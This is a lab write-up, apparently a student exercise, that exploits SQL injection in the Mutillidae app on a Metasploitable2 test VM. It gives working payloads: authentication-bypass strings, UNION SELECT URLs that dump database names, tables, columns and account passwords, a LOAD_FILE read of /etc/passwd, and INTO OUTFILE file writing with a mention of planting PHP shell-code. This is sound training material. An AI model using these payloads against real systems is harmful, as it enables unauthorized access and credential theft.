# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![1](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/cb126fef-27cf-451d-bad1-aee380e1436b)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. Screenshot 2023-06-10 213747 Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![2](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/5ebbbcf6-5240-403e-86c1-ca14993e279a)

![3](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/4f228bbc-f120-4b84-a9f7-903e6688192d)

Click on the link “Please register here” Screenshot 2023-06-10 214117

Click on “Create Account” to display the following page: Screenshot 2023-06-10 214903 The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![4](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/c1101def-37c1-4058-9835-23fd834e08dd)

Click “Login”. The logged in page will show as below: 
![5](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/13e542a9-1762-48d5-9a7c-7a3ca5d0e4ac)

Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![6](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/52a41e42-f27c-4bf4-9ee0-ccd97cfcb990)

Click the login button and you will see it enter into the administrator page.
![7](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/855f4270-42f9-4c3b-83d7-b23412670988)

Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 
![8](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/21080d30-2d0f-46ae-9618-a3f7bddb39a3)


![9](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/d5e33413-415a-4ea4-92ff-464744c4467d)

![10](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/af7fb74d-937f-43d5-8b85-cc1668e140cd)

![11](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/4bd48827-6f41-42bb-97b6-4a5e1899d23b)

![12](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/8594b53f-976e-454d-a08c-32fdd6966cc2)
 From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
 ![13](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/0bc4eaf3-41c5-4734-9142-735ddb895185)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![14](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/8797dc5a-b1dc-4138-be31-e78c855fb162)

After adding the order by 6 into the existing url , the following error statement will be obtained: 
![15](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/e5fec3c9-a23b-45a7-946f-862049aeaeda)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. ![16](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/1c7349ce-348d-44bc-9f09-b09e27a597c7)


As it is having 5 columns the query worked fine and it provides the correct result

![17](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/81b5786b-c48c-4185-9086-a42977cfbf9c)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![18](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/ca7c1f0f-1525-4380-bd04-16a3fd254cd9)

 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 
 ![19](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/dfb6efd8-d432-447b-a164-73cc5a3e2733)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![20](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/9455bcaf-9acc-4d23-b434-2d269b8363d6)
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![21](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/598f3bf3-c004-493c-9035-003d8fb63499)

The url once executed will retrieve table names from the “owasp 10” database.
Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![22](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/0fd4650b-d1a2-4811-a319-dc61c06e7179)
 The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![23](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/fdbf6866-ff53-4ef0-8a9f-5c6763046b62)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![24](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/71512939-38ce-43f6-bfd6-b824c4d6a845)
Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 
![25](https://github.com/lokeshrahulv/sqlinjection/assets/118423842/54882b42-4349-44d3-b940-a0e21085576c)
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
